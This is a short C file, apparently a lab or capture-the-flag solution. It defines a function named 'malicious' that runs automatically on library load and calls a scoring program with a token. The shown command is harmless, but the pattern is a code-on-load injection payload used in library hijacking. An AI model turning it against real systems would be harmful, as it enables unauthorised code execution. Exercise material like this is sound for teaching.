#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
	    system("/usr/local/bin/score d6e8b179-52be-4532-99da-aa964be72fb6");
}
